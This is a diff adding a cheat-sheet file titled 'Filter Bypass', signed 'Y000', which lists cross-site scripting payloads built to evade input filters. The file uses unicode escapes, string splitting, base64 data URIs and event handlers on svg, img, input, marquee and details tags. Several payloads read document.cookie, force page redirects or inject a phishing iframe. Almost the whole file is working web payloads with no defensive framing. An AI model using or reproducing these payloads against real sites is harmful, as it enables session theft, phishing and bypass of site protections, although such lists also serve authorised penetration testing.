@@ -1,0 +1,54 @@
+
+                                                                 ***Filter Bypass***
+
+self[`aler`%2b`t`]`1`
+'new Function`al\ert\`1\``'
+'new Function`pro\mpt\`1\``'
+alert(document['cookie']) 
+with(document)alert(cookie) 
+eval('ale'+'rt(1)')window['alert'](0)
+<h1 onclick=\u0041\u006cert("_Y000!_")>Y00</h1>
+<a onclick=\u0041\u006cert("_Y000!_")>Y00</a>
+<p onclick=\u0041\u006cert("_Y000!_")>Y00</p>
+<marquee onclick=\u0041\u006cert("_Y000!_")>Y00</marquee>
+onMouseOver=<script>alert("/XSS BY Y000!/")</script>
+</script><h1 onmouseover= top[8680439..toString(30)]("_Y000!_")>
+</script><h1 onmouseover=top[/al/.source+/ert/.source]("_Y000!_")>
+</script><h1 onmouseover=["_Y000!_"].find(alert)>
+</script><h1 onmouseover= (((confirm)))`_Y000!_`>
+<input onblur=top[/al/.source+/ert/.source]("_Y00!_") autofocus><input autofocus>
+<input onblur=["_Y00!_"].find(alert) autofocus><input autofocus>
+<input onblur=(((confirm)))("_Y00!_") autofocus><input autofocus>
+<p/onclick=%27new%20Function`al\ert\`\u0059\u0030\u0030\u0030\``%27>d
+<p/onclick=self[`aler`%2b`t`]`\u0059\u0030\u0030\u0030`>d
+Xss dentro de un botón en form:
+<form><button formaction=javascript&colon;alert('xss_by_Y000!')>_Y000!_
+<marquee><form><button formacti\u006fn=javascript&colon;pr\u006fmpt('xss_by_Y000!')>_Y000!_</marquee>
+<img/src=%27https://i.imgur.com/kkum7k2.jpg%27%20onmouseover=prompt("_Y000!_")
+<Img src="/" =_=" title=" onerror='prompt(document.cookie)'">
+<marquee direction="down" width="250" height="200" behavior="alternate" style="border:solid">
+  <marquee behavior="alternate">
+    Xss by Y000
+  </marquee>
+ <marquee behavior="alternate">
+    Y000
+  </marquee>
+</marquee>
+Marquee + alert
+<marquee loop=1 width=0 onfinish=pr\u006fmpt(document.cookie)>Y000</marquee>
+onload / onfocus
+"onfocus="alert('Y000')"+autofocus="
+</script><!--><svg onload=[document.domain].find%26%2340;alert%26rpar;>
+"><svg/onload=alert`${'000'}¥000!.was.here$`>
+<svg/onload=eval("ale"+"rt")(`✓${alert`✓`}`)>
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+location="http://google.com"
+document.location = "http://google.com"
+document.location.href="http://google.com"
+window.location.assign("http://google.com")
+window['location']['href']="http://google.com"
+<object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydGBZMDAwYDwvc2NyaXB0Pg=='></object>
+document.write + iframe
+<img src="x" onerror="document.write('<iframe src=tu_phishing></iframe>')"/>
+<marquee loop=1 width=0 onfinish=\u0070\u0072\u006f\u006d\u0070\u0074(document.cookie)>Y000</marquee>
+"><details/open/ontoggle=confirm/xss_by_Y000!/>
